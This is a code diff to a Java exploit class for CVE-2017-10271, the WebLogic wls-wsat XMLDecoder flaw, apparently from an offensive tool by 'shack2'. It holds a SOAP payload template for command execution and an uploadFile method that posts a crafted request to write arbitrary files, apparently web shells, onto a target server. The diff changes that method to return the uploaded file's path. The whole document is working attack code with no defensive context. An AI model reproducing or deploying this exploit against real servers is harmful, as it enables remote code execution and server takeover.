@@ -12,7 +12,7 @@ import java.util.Random;
  *
  * @author shack2
  */
-public class CVE_2017_10271 implements BasePayload {
+public class CVE_2017_10271_10 implements BasePayload {
     private static final String CheckStr="xmldecoder_vul_test"; 
     private static final String VULURL="/wls-wsat/CoordinatorPortType";
     private static final String FileAbsPath="/wls-wsat/"; 
@@ -36,7 +36,7 @@ public class CVE_2017_10271 implements BasePayload {
 "    <soapenv:Body/>\n" +
 "</soapenv:Envelope>";
     
-    private static final String VUL_CMD="<?xml version=\"1.0\" encoding=\"utf-8\"?>\n" +
+    private static String VUL_CMD="<?xml version=\"1.0\" encoding=\"utf-8\"?>\n" +
 "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\">\n" +
 "    <soapenv:Header>\n" +
 "        <work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\">\n" +
@@ -128,10 +128,12 @@ public class CVE_2017_10271 implements BasePayload {
     }
 
     @Override
-    public boolean uploadFile(String url,String fileContent, String filename,boolean useUserPath) throws Exception{
+    public String uploadFile(String url,String fileContent, String filename,boolean useUserPath) throws Exception{
          try {
             String payload="";
+            String respath=filename;
             if(useUserPath){
+                respath=url+FileAbsPath+filename;
                 payload=String.format(UploadFile_VUL_UserPath, filename,fileContent);
             }
             else{
@@ -139,13 +141,13 @@ public class CVE_2017_10271 implements BasePayload {
             }
             String result=HttpTool.postHttpReuestByXML(url+VULURL, payload,"UTF-8");
             if(UploadCheckStr.equals(result)){
-                    return true;
+                    return respath;
             }
             
         } catch (Exception e) {
            throw e;
         }
-        return false;
+        return "";
     }
 
     @Override
